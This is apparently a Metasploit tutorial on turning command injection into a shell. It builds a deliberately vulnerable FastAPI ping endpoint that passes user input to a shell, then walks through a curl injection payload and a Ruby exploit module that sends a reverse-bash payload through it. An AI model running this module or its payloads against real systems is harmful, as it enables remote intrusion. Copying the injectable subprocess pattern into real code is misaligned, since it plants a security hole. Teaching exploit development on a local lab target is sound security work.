If you've found a way to execute a command on a target, and you'd like to make a simple exploit module to get a shell, this guide is for you. Alternatively, if you have access to **fetch** commands on the target (curl, wget, ftp, tftp, tnftp, or certutil), you can use a [[Fetch Payload|How-to-use-fetch-payloads]] for a no-code solution.

By the end of this guide you'll understand how to turn [Command injection](https://owasp.org/www-community/attacks/Command_Injection) into a shell - from here, you can move on to the [[command stager|How-to-use-command-stagers]] article and upgrade your basic `:unix_cmd` Target to a Dropper for all kinds of payloads with variable command stagers.

This guide assumes *some* knowledge of programming (Understand what a class is, what methods/functions are) but expects no in-depth knowledge of Metasploit internals.

## A Vulnerable Service

For the vulnerable service test case, we'll be using a simple FastAPI service. This is very easy to spin up:

1. Install `fastapi[all]` using your preferred Python package manager (a virtual environment is recommended)
2. Create a file to hold some Python code (I'll call it `main.py`)
3. Copy the following code into your file:

    ```python
    from fastapi import FastAPI, Response
    import subprocess

    app = FastAPI()

    @app.get("/ping")
    def ping(ip : str):
        res = subprocess.run(f"ping -c 1 {ip}", shell=True, capture_output=True)
        return Response(content=res.stdout.decode("utf-8"), media_type="text/plain")
    ```

4. Start your vulnerable service with `uvicorn main:app`
5. Test that the application works with `curl`:

    ```sh
    $ curl http://localhost:8000/ping?ip=1.1.1.1
    PING 1.1.1.1 (1.1.1.1) 56(84) bytes of data.
    64 bytes from 1.1.1.1: icmp_seq=1 ttl=58 time=16.7 ms

    --- 1.1.1.1 ping statistics ---
    1 packets transmitted, 1 received, 0% packet loss, time 0ms
    rtt min/avg/max/mdev = 16.739/16.739/16.739/0.000 ms
    ```

6. Test that your application is exploitable - also with `curl`:

    ```sh
    $ curl localhost:8000/ping?ip=1.1.1.1%20%26%26id
    PING 1.1.1.1 (1.1.1.1) 56(84) bytes of data.
    64 bytes from 1.1.1.1: icmp_seq=1 ttl=58 time=16.6 ms

    --- 1.1.1.1 ping statistics ---
    1 packets transmitted, 1 received, 0% packet loss, time 0ms
    rtt min/avg/max/mdev = 16.614/16.614/16.614/0.000 ms
    uid=1000(meta) gid=1000(meta)
    ```

With this output `uid=1000(meta) gid=1000(meta)`, we know that the `id` command successfully executed on the target system. Now that we have a vulnerable application we can write a module to pwn it.

## The Structure of a Module

To have a functioning command injection Metasploit module we **need** a few things:

1. Create a subclass of `Msf::Exploit::Remote`
2. Include the `Msf::Exploit::Remote::HttpClient` mixin
3. Define three methods:
   - `initialize`, which defines metadata for the Module
   - `execute_command`, which is what runs the command against the remote server
   - `exploit`, wraps `execute_command`, and can handle some logic when we move to a cmdstager module
4. (Not required, but recommended) a method to substitute or escape bad characters, to be used inside `execute_command`. This could also just be done inside `execute_command` instead of a separate function call.

### Where to put a Module

Metasploit looks for custom modules at `$HOME/.msf4/modules`, but the way you get modules there varies based on how you're running Metasploit.

- If you have a full install of Metasploit on your host, you can just add your custom module to `$HOME/.msf4/modules/exploits/custom_mod.rb`.
  - You can also just add a module to Metasploit's modules folder - This can be helpful when troubleshooting, but it's not recommended
- **Docker** If you're using the [Docker Image](https://github.com/rapid7/metasploit-framework/tree/master/docker), you can also add modules to `$HOME/.msf4/modules` and that folder will be mounted as a volume inside the Docker container
  - You can also change the mount point by modifying the [docker-compose](https://github.com/rapid7/metasploit-framework/blob/master/docker-compose.yml) file

For testing, the easiest thing to do is the simplest. You can find Metasploit's **exploit** directory, copy a file, rename it, and go from there.

## A Shell of a Module

The shell of a module that follows the above format is something like this:

```ruby
class MetasploitModule < msf::Exploit::Remote
  Rank = GoodRanking
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    # empty for now
  end

  def filter_bad_chars(cmd)
    # empty for now
  end

  def execute_command(cmd, _opts = {})
    # empty for now
  end

  def exploit
    # empty for now
  end
end
```

This covers every essential point from [The Structure of a Module](#the-structure-of-a-module), although it won't run yet.

## Initialize

The `initialize` method is used to define and pass metadata. Every `initialize` method in the metasploit-framework codebase follows the format of an empty `info` being passed into `update_info`, which gets passed to the `msf::Exploit::Remote` `initialize` method:

```ruby
def initialize(info = {})
  super(
    update_info(
      info,
      # Here is where the metadata goes
      'Name' => 'Command Injection against a test Ping endpoint',
      'Description' => 'This exploits a command injection vulnerability against a test application',
      'License' => MSF_LICENSE,
      'Author' => 'YOUR NAME',
      'References' => [
        ['URL', 'https://metasploit.com/']
      ],
      'DisclosureDate' => '2023-08-04',
      'Platform' => 'linux', # used for determining compatibility - if you're doing code injection, this may be the language of the webapp
      'Targets' => [
        'Unix Command',
        {
          'Platform' => ['linux', 'unix'], # linux and unix have different cmd payloads, this gives you more options
          'Arch' => ARCH_CMD,
          'Type' => :unix_cmd, # Running a command - this would be `:linux_dropper` for a cmdstager dropper
          'DefaultOptions' => {
            'PAYLOAD' => 'cmd/unix/reverse_bash',
            'RPORT' => 8000,
          }
        }
      ],
      'Payload' => {
        'BadChars' => '\x00',
      }
      'Notes' => { # Required for new modules https://docs.metasploit.com/docs/development/developing-modules/module-metadata/definition-of-module-reliability-side-effects-and-stability.html
        'Stability' => [CRASH_SAFE],
        'Reliability' => [REPEATABLE_SESSION],
        'SideEffects' => [IOC_IN_LOGS]
      }
      # Some more metadata options are here: https://docs.metasploit.com/docs/development/developing-modules/module-metadata/module-reference-identifiers.html#code-example-of-references-in-a-module
    )
  )
end
```

All that this method does is register metadata to the module.

## Filtering

It's important to ensure that payloads being sent are properly encoded. As an example, if you send a request to the `/ping` endpoint that looks like `/ping?ip=1.1.1.1&&id`, you won't see the "uid=1000(meta) gid=1000(meta)" in the response because `&` is a special character in HTTP.

Encoding requirements might change based on the application you're trying to inject, so experiment if things aren't working.

```ruby
def filter_bad_chars(cmd)
  return cmd
    .gsub(/&/, '%26')
    .gsub(/ /, '%20')
end
```

`filter_bad_chars` takes in `cmd`, which is a string. `cmd` has two substitutions applied - the first will translate `&` to `%26`, the second translates a space to `%20`. The `.gsub` statements are a global substitution across the string, so the entire payload is impacted by the substitutions here (Similar to str.replace in Python). Regardless of whether or not the string is modified, it is returned.

## Execution

The `execute_command` method takes in `cmd` and `_opts` and executes the command on the target. In our case, executing a command is simply adding the command to a GET request and sending it to the `/ping` endpoint on our sample service.

```ruby
def execute_command(cmd, _opts = {})
  send_request_cgi({
    'method' => 'GET',
    'uri' => '/ping',
    'encode_params' => false,
    'vars_get' => {
      'ip' => "bing.com%20%26%26%20#{filter_bad_chars(cmd)}",
    }
  })
end
```

We don't even need to handle the output of `send_request_cgi` (Really, there should be no return until the shell exits, since the call to `subprocess.run` doesn't return until that shell dies).

## Exploitation

To finish up, all we need is to define the `exploit` method. This method is called by Metasploit when you use `run` within a msfconsole. All that we'll do here is print a little status message and run the exploit, but later you can modify this method to handle droppers as well:

```ruby
def exploit
  print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")
  execute_command(payload.encoded)
end
```

If you're running Metasploit and the vulnerable Python service on the same machine, you should be able to simply set the variables and fire:

```sh
set RHOST 127.0.0.1
set LHOST 127.0.0.1
run
```

## Conclusion

That's it. Put it all together and you have a very simple Command Injection exploit module that shows you the basics of how to throw a payload. Play around with different payloads, follow the [[How-to-use-command-stagers]] guide, add some logging to the Python web server, and watch executions over Wireshark. You'll learn a lot.
